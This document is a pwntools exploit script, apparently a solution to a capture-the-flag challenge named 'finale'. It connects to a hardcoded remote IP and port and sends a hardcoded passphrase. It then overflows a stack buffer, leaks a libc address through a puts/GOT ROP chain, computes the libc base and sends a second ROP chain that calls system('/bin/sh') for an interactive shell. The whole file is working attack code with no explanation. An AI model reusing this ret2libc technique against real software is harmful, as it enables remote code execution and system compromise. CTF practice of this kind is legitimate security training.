#!/usr/bin/env python3

from pwn import *

exe = ELF("./finale_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

#p = process()
p = remote('83.136.254.158',43618)
p.sendlineafter(b'phrase: ',b's34s0nf1n4l3b00')
p.recvuntil(b'luck: [')

leak = int(p.recvuntil(b']')[:-1],16)
print("leak: ",hex(leak))
pop_rdi  = 0x00000000004011f2

payload = b'a'*64 
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(exe.plt.puts)
payload += p64(0x0000000000401315)
p.send(payload)

p.recvuntil(b'you!')
p.recvlines(2)
leak_2 = u64(p.recv(6).ljust(8,b'\x00'))
print("leak: ",hex(leak_2))

libc.address = leak_2 - 0x84420
print("libc: ",hex(libc.address))

payload2 = b'a'*72
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh\x00')))
payload2 += p64(pop_rdi+1)
payload2 += p64(libc.sym.system)
p.send(payload2)
p.interactive()
